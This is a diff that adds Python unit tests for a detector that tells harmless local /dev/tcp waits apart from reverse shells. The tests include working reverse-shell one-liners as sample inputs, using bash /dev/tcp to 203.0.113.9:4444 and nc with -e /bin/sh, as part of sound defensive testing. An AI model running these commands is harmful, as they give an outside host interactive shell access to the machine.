@@ -210,3 +210,16 @@ class RevisionTests(unittest.TestCase):
 
 if __name__ == "__main__":
     unittest.main()
+
+
+class ShellReversaLocalTests(unittest.TestCase):
+    def test_espera_local_no_es_shell_reversa(self):
+        from sentinel.equipo import solo_destinos_locales as f
+        self.assertTrue(f("bash -c until (echo > /dev/tcp/127.0.0.1/8080) 2>/dev/null; do sleep 1; done"))
+        self.assertTrue(f("bash -c exec 3<>/dev/tcp/localhost/80"))
+
+    def test_destino_externo_o_patron_clasico_sigue_alertando(self):
+        from sentinel.equipo import solo_destinos_locales as f
+        self.assertFalse(f("bash -i >& /dev/tcp/203.0.113.9/4444 0>&1"))
+        self.assertFalse(f("bash -c 'exec 3<>/dev/tcp/127.0.0.1/80; bash -i >&3'"))
+        self.assertFalse(f("nc 10.0.0.1 4444 -e /bin/sh"))
